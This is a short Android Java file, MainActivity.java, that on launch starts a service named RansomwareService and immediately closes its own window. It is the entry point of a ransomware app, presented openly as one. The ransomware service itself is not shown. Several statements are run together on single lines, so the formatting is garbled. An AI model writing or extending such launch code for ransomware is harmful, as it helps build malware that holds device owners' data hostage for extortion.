MainActivity.java:

import android.content.Intent;import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
public class MainActivity extends AppCompatActivity {
    @Override    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);        Intent serviceIntent = new Intent(this, RansomwareService.class);
        startService(serviceIntent);        finish();
    }}